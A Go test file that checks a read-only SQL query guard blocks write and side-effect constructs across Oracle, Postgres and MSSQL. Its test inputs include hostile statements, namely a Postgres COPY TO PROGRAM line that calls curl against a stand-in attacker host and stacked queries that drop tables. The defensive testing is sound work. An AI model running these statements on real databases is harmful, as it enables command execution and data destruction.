package database

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

type guardTestEvidence struct {
	Type string `yaml:"type"`
	SQL  string `yaml:"sql"`
}

type guardTestProcedure struct {
	ExecutionMode string `yaml:"execution_mode"`
	Tests         string `yaml:"tests"`
}

type guardTestControl struct {
	ControlCode     string               `yaml:"control_code"`
	Procedures      []guardTestProcedure `yaml:"procedures"`
	EvidenceCapture []guardTestEvidence  `yaml:"evidence_capture"`
}

type guardTestControlSet struct {
	Metadata struct {
		DatabaseType string `yaml:"database_type"`
	} `yaml:"metadata"`
	Controls []guardTestControl `yaml:"controls"`
}

// TestValidateReadOnlyQueryBlocksConstructsMissedByKeywordBlacklist guards
// against read/write constructs that a plain keyword blacklist misses
// because they don't contain a lexical DML keyword at all: stored-procedure
// invocation, dynamic SQL, and engine-specific write/side-effect commands.
func TestValidateReadOnlyQueryBlocksConstructsMissedByKeywordBlacklist(t *testing.T) {
	tests := []struct {
		name   string
		dbType string
		sql    string
	}{
		{"oracle dynamic SQL via EXECUTE IMMEDIATE", "oracle", "BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;"},
		{"oracle stored procedure call", "oracle", "CALL some_procedure()"},
		{"postgres stored procedure call", "postgres", "CALL some_procedure()"},
		{"postgres COPY to program", "postgres", "COPY (SELECT 1) TO PROGRAM 'curl evil.example'"},
		{"postgres anonymous PL/pgSQL block", "postgres", "DO $$ BEGIN PERFORM 1; END $$"},
		{"postgres LISTEN", "postgres", "LISTEN some_channel"},
		{"postgres NOTIFY", "postgres", "NOTIFY some_channel"},
		{"postgres bare SELECT INTO creates a table", "postgres", "SELECT * INTO new_table FROM users"},
		{"supabase stored procedure call", "supabase", "CALL some_procedure()"},
		{"oracle stacked query", "oracle", "SELECT 1 FROM dual; DROP TABLE users"},
		{"postgres statement not starting with a read verb", "postgres", "GRANT SELECT ON users TO PUBLIC; SELECT 1"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := validateReadOnlyQuery(tt.dbType, tt.sql); err == nil {
				t.Fatalf("expected %q to be blocked for dbType=%s", tt.sql, tt.dbType)
			}
		})
	}
}

// TestValidateReadOnlyQueryMSSQLBlocksSelectInto guards against
// "SELECT ... INTO <target>" table creation, distinct from the already
// allowed "INSERT INTO <temp target> ... SELECT ..." staging pattern.
func TestValidateReadOnlyQueryMSSQLBlocksSelectInto(t *testing.T) {
	if err := validateReadOnlyQuery("mssql", "SELECT * INTO dbo.permanent_table FROM sys.tables"); err == nil {
		t.Fatal("expected SELECT INTO a permanent table to be blocked")
	}

	// Existing legitimate pattern must still work: INSERT INTO a temp table
	// from a SELECT, not a bare SELECT...INTO.
	if err := validateReadOnlyQuery("mssql", "DECLARE @t TABLE (id int); INSERT INTO @t SELECT id FROM sys.tables;"); err != nil {
		t.Fatalf("expected INSERT INTO temp table from SELECT to be allowed: %v", err)
	}
}

// TestValidateReadOnlyQueryMSSQLDBCCSubcommandAllowlist guards against DBCC
// invocations with a destructive subcommand (CHECKIDENT ... RESEED,
// SHRINKDATABASE, FREEPROCCACHE) while confirming a genuinely read-only DBCC
// diagnostic (LOGINFO) invoked directly is still allowed. A blanket DBCC ban
// was tried first and rejected: it broke the legitimate LOGINFO case, so each
// subcommand must be checked individually.
func TestValidateReadOnlyQueryMSSQLDBCCSubcommandAllowlist(t *testing.T) {
	blocked := []string{
		"DBCC CHECKIDENT ('users', RESEED, 0)",
		"DBCC SHRINKDATABASE(mydb)",
		"DBCC FREEPROCCACHE",
	}
	for _, sql := range blocked {
		if err := validateReadOnlyQuery("mssql", sql); err == nil {
			t.Fatalf("expected %q to be blocked", sql)
		}
	}

	if err := validateReadOnlyQuery("mssql", "DBCC LOGINFO([tempdb])"); err != nil {
		t.Fatalf("expected direct DBCC LOGINFO to be allowed: %v", err)
	}

	// Capturing DBCC output via sp_executesql is no longer a supported
	// pattern: sp_executesql is forbidden outright (see isAllowedExecTarget),
	// regardless of the DBCC subcommand's own read-only status.
	viaDynamicSQL := "DECLARE @vlf TABLE (FileId int);\nDECLARE @sql nvarchar(200) = 'DBCC LOGINFO([tempdb])';\nINSERT INTO @vlf\nEXEC sp_executesql @sql;\nDELETE FROM @vlf;"
	if err := validateReadOnlyQuery("mssql", viaDynamicSQL); err == nil {
		t.Fatalf("expected DBCC LOGINFO via sp_executesql to be blocked: %q", viaDynamicSQL)
	}
}

// TestValidateReadOnlyQueryMSSQLBlocksKillAndReconfigure guards against
// session/server-state-changing MSSQL statements with no DML keyword:
// KILL terminates another session's query, RECONFIGURE applies server-wide
// configuration changes.
func TestValidateReadOnlyQueryMSSQLBlocksKillAndReconfigure(t *testing.T) {
	blocked := []string{"KILL 57", "RECONFIGURE"}
	for _, sql := range blocked {
		if err := validateReadOnlyQuery("mssql", sql); err == nil {
			t.Fatalf("expected %q to be blocked", sql)
		}
	}
}

// TestValidateReadOnlyQueryAcceptsBundledControlPackSQL confirms every
// procedure and evidence-capture SQL statement shipped in control-sets/*.yaml
// passes the read-only query guard for its database type. If tightening the
// guard breaks this, the affected control's SQL needs fixing, not the guard
// relaxing.
func TestValidateReadOnlyQueryAcceptsBundledControlPackSQL(t *testing.T) {
	controlSetsDir := "../../control-sets"
	if _, err := os.Stat(controlSetsDir); os.IsNotExist(err) {
		t.Skip("control-sets directory not found (running from different directory)")
	}

	entries, err := os.ReadDir(controlSetsDir)
	if err != nil {
		t.Fatalf("failed to read control-sets directory: %v", err)
	}

	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".yaml") {
			continue
		}

		filename := entry.Name()
		t.Run(filename, func(t *testing.T) {
			data, err := os.ReadFile(filepath.Join(controlSetsDir, filename))
			if err != nil {
				t.Fatalf("failed to read %s: %v", filename, err)
			}

			var set guardTestControlSet
			if err := yaml.Unmarshal(data, &set); err != nil {
				t.Fatalf("failed to parse %s: %v", filename, err)
			}

			dbType := set.Metadata.DatabaseType
			if dbType == "" {
				t.Fatalf("%s: missing metadata.database_type", filename)
			}

			for _, control := range set.Controls {
				for _, proc := range control.Procedures {
					mode := strings.ToLower(strings.TrimSpace(proc.ExecutionMode))
					if mode != "" && mode != "sql" {
						continue // not a raw-SQL procedure (e.g. http, active_validation)
					}
					if strings.TrimSpace(proc.Tests) == "" {
						continue
					}
					if err := validateReadOnlyQuery(dbType, proc.Tests); err != nil {
						t.Errorf("control %s: procedure SQL rejected by guard: %v\nSQL: %s",
							control.ControlCode, err, proc.Tests)
					}
				}
				for _, evidence := range control.EvidenceCapture {
					if strings.TrimSpace(evidence.SQL) == "" {
						continue
					}
					if err := validateReadOnlyQuery(dbType, evidence.SQL); err != nil {
						t.Errorf("control %s: evidence_capture[%s] SQL rejected by guard: %v\nSQL: %s",
							control.ControlCode, evidence.Type, err, evidence.SQL)
					}
				}
			}
		})
	}
}
